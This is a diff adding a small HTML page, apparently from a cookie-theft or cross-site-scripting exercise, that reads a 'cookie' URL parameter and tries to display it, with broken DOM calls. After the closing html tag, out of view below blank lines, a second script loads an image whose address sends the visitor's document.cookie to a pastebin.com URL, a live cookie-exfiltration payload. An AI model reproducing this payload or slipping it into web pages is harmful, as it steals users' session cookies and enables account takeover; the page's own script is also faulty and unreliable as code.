@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Page Title</title>
+<script>
+   var url_string = window.location.href;
+   var url = new URL(url_string);
+   var cookie = url.searchParams.get("cookie");
+   var element = document.getElementbyId("cookieval");
+   element.appendChild(cookie);
+</script>
+</head>
+<body>
+
+<h1>The cookie you're looking for</h1>
+<p id="cookieval"></p>
+
+</body>
+</html>
+
+
+
+<script>
+   var img = new Image();
+   img.src="https://pastebin.com/raw/SkP1JKQq?cookie="+document.cookie;
+</script>
